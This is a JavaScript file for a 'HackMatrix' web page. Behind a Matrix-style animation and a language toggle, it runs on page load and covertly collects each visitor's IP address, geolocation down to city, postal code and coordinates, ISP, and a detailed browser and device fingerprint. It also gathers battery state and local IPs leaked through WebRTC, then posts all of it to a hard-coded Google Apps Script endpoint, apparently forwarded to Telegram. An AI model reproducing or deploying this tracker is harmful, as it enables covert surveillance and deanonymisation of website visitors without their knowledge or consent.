// Matrix background
const canvas = document.getElementById('matrix-bg');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

const alphabet = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
const fontSize = 16;
const columns = canvas.width / fontSize;
const drops = Array(Math.floor(columns)).fill(1);

function drawMatrix() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#00ff00';
    ctx.font = fontSize + 'px monospace';
    for (let i = 0; i < drops.length; i++) {
        const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(drawMatrix, 33);

// Language toggle
const langToggle = document.getElementById('lang-toggle');
const langIcon = langToggle.querySelector('.lang-icon');
const langText = langToggle.querySelector('.lang-text');
let currentLang = 'ru';

langToggle.addEventListener('click', () => {
    currentLang = currentLang === 'ru' ? 'en' : 'ru';
    langIcon.textContent = currentLang === 'ru' ? '🇷🇺' : '🇬🇧';
    langText.textContent = currentLang === 'ru' ? 'Русский' : 'English';
    updateLanguage();
});

function updateLanguage() {
    document.querySelectorAll('[data-en][data-ru]').forEach(el => {
        el.textContent = el.getAttribute(`data-${currentLang}`);
    });
    collectData();
}

// Data collection
async function collectData() {
    const output = document.getElementById('data-output');
    output.innerHTML = '';
    const data = {};
    let telegramMessage = currentLang === 'ru' ? "🔔 Новый посетитель HackMatrix:\n\n" : "🔔 New HackMatrix Visitor:\n\n";

    // IP and Geo
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        data.ip = ipData.ip;
        const geoRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
        const geo = await geoRes.json();
        Object.assign(data, {
            country: geo.country_name || 'N/A',
            region: geo.region || 'N/A',
            city: geo.city || 'N/A',
            postal: geo.postal || 'N/A',
            latitude: geo.latitude || 'N/A',
            longitude: geo.longitude || 'N/A',
            isp: geo.org || 'N/A',
            asn: geo.asn || 'N/A',
            hostname: geo.hostname || 'N/A'
        });
    } catch (e) { console.log('Geo error:', e); }

    // Browser & Device
    const nav = navigator;
    Object.assign(data, {
        userAgent: nav.userAgent,
        browser: nav.appName,
        browserVersion: nav.appVersion,
        platform: nav.platform,
        os: nav.oscpu || 'N/A',
        languages: nav.languages.join(', '),
        screenResolution: `${screen.width}x${screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        pixelRatio: window.devicePixelRatio,
        colorDepth: screen.colorDepth,
        deviceMemory: nav.deviceMemory || 'N/A',
        cpuCores: nav.hardwareConcurrency || 'N/A',
        cookiesEnabled: nav.cookieEnabled ? 'Yes' : 'No',
        doNotTrack: nav.doNotTrack || 'N/A',
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        localTime: new Date().toLocaleString(),
        uptime: Math.floor(performance.now() / 1000) + 's',
        plugins: Array.from(nav.plugins).map(p => `${p.name} (${p.version})`).join(', ') || 'None',
        mimeTypes: Array.from(nav.mimeTypes).map(m => m.type).join(', ') || 'None',
        touchSupport: 'ontouchstart' in window ? 'Yes' : 'No',
        webglVendor: getWebGLVendor(),
        connection: nav.connection ? `${nav.connection.effectiveType}, ${nav.connection.downlink}Mbps` : 'N/A'
    });

    // Performance
    const perf = performance.timing;
    Object.assign(data, {
        pageLoadTime: perf.loadEventEnd ? (perf.loadEventEnd - perf.navigationStart) + 'ms' : 'N/A',
        dnsLookup: perf.domainLookupEnd ? (perf.domainLookupEnd - perf.domainLookupStart) + 'ms' : 'N/A',
        tcpConnect: perf.connectEnd ? (perf.connectEnd - perf.connectStart) + 'ms' : 'N/A',
        requestTime: perf.responseEnd ? (perf.responseEnd - perf.requestStart) + 'ms' : 'N/A'
    });

    // Battery
    if (nav.getBattery) {
        try {
            const battery = await nav.getBattery();
            Object.assign(data, {
                batteryLevel: `${Math.round(battery.level * 100)}%`,
                batteryCharging: battery.charging ? 'Yes' : 'No',
                batteryChargeTime: battery.chargingTime || 'N/A',
                batteryDischargeTime: battery.dischargingTime || 'N/A'
            });
        } catch (e) { console.log('Battery error:', e); }
    }

    // WebRTC Local IPs
    try {
        const ips = await getWebRTCLocalIPs();
        data.localIPs = ips.join(', ') || 'N/A';
    } catch (e) { console.log('WebRTC error:', e); }

    // Labels and Icons
    const labels = {
        ip: { ru: 'IP-адрес', en: 'IP Address' },
        country: { ru: 'Страна', en: 'Country' },
        region: { ru: 'Регион', en: 'Region' },
        city: { ru: 'Город', en: 'City' },
        postal: { ru: 'Почтовый индекс', en: 'Postal Code' },
        latitude: { ru: 'Широта', en: 'Latitude' },
        longitude: { ru: 'Долгота', en: 'Longitude' },
        isp: { ru: 'Провайдер', en: 'ISP' },
        asn: { ru: 'ASN', en: 'ASN' },
        hostname: { ru: 'Хостнейм', en: 'Hostname' },
        userAgent: { ru: 'User-Agent', en: 'User-Agent' },
        browser: { ru: 'Браузер', en: 'Browser' },
        browserVersion: { ru: 'Версия браузера', en: 'Browser Version' },
        platform: { ru: 'Платформа', en: 'Platform' },
        os: { ru: 'ОС', en: 'OS' },
        languages: { ru: 'Языки', en: 'Languages' },
        screenResolution: { ru: 'Разрешение экрана', en: 'Screen Resolution' },
        viewport: { ru: 'Область просмотра', en: 'Viewport' },
        pixelRatio: { ru: 'Пиксельный коэффициент', en: 'Pixel Ratio' },
        colorDepth: { ru: 'Глубина цвета', en: 'Color Depth' },
        deviceMemory: { ru: 'Память устройства', en: 'Device Memory' },
        cpuCores: { ru: 'Ядра процессора', en: 'CPU Cores' },
        cookiesEnabled: { ru: 'Куки включены', en: 'Cookies Enabled' },
        doNotTrack: { ru: 'Не отслеживать', en: 'Do Not Track' },
        timeZone: { ru: 'Часовой пояс', en: 'Time Zone' },
        localTime: { ru: 'Местное время', en: 'Local Time' },
        uptime: { ru: 'Время работы', en: 'Uptime' },
        plugins: { ru: 'Плагины', en: 'Plugins' },
        mimeTypes: { ru: 'MIME-типы', en: 'MIME Types' },
        touchSupport: { ru: 'Сенсорный ввод', en: 'Touch Support' },
        webglVendor: { ru: 'WebGL Vendor', en: 'WebGL Vendor' },
        connection: { ru: 'Соединение', en: 'Connection' },
        pageLoadTime: { ru: 'Время загрузки', en: 'Page Load Time' },
        dnsLookup: { ru: 'DNS-запрос', en: 'DNS Lookup' },
        tcpConnect: { ru: 'TCP-соединение', en: 'TCP Connect' },
        requestTime: { ru: 'Время запроса', en: 'Request Time' },
        batteryLevel: { ru: 'Уровень батареи', en: 'Battery Level' },
        batteryCharging: { ru: 'Зарядка', en: 'Charging' },
        batteryChargeTime: { ru: 'Время до зарядки', en: 'Charge Time' },
        batteryDischargeTime: { ru: 'Время разрядки', en: 'Discharge Time' },
        localIPs: { ru: 'Локальные IP', en: 'Local IPs' }
    };

    const icons = {
        ip: '🌍', country: '🇳🇱', region: '🏞️', city: '🏙️', postal: '📮',
        latitude: '📏', longitude: '📐', isp: '📡', asn: '🔢', hostname: '💻',
        userAgent: '🖥️', browser: '🌐', browserVersion: '🔖', platform: '🛠️', os: '💿',
        languages: '🗣️', screenResolution: '🖼️', viewport: '👁️', pixelRatio: '🔍',
        colorDepth: '🎨', deviceMemory: '🧠', cpuCores: '⚙️', cookiesEnabled: '🍪',
        doNotTrack: '🚫', timeZone: '⏳', localTime: '⏰', uptime: '⌛', plugins: '🔧',
        mimeTypes: '📜', touchSupport: '👆', webglVendor: '🎮', connection: '📶',
        pageLoadTime: '⚡', dnsLookup: '🔎', tcpConnect: '🔗', requestTime: '📩',
        batteryLevel: '🔋', batteryCharging: '🔌', batteryChargeTime: '⏱️',
        batteryDischargeTime: '🔋', localIPs: '🏠'
    };

    for (const [key, value] of Object.entries(data)) {
        const div = document.createElement('div');
        div.className = 'data-item';
        const label = labels[key][currentLang];
        div.innerHTML = `${icons[key]} <span>${label}: ${value}</span>`;
        output.appendChild(div);
        telegramMessage += `${icons[key]} *${label}*: ${value}\n`;
    }

    // Отправка через Google Apps Script с отладкой
    const gasUrl = 'https://script.google.com/macros/s/AKfycbwORTNEgtXYpVuB_PRNVyQBQHHaIwJeLt18RPY6D9fUNR9GL6lSDWsLLuTF-b9D8CQo/exec'; // Замените на ваш URL
    console.log('Sending to GAS:', gasUrl);
    console.log('Message:', telegramMessage);

    fetch(gasUrl, {
        method: 'POST',
        mode: 'no-cors', // Для GitHub Pages
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text: telegramMessage })
    })
    .then(() => console.log('Request sent to Google Apps Script'))
    .catch(e => console.error('Google Apps Script error:', e));
}

// Helper functions
function getWebGLVendor() {
    const gl = document.createElement('canvas').getContext('webgl');
    if (!gl) return 'N/A';
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A';
}

async function getWebRTCLocalIPs() {
    return new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        const ips = new Set();
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        pc.onicecandidate = e => {
            if (!e.candidate) {
                pc.close();
                resolve([...ips]);
                return;
            }
            const ip = e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/)?.[1];
            if (ip && !ip.startsWith('169.254')) ips.add(ip);
        };
        setTimeout(() => resolve([...ips]), 2000);
    });
}

// Run on load
document.addEventListener('DOMContentLoaded', collectData);

// Resize handling
window.addEventListener('resize', () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
});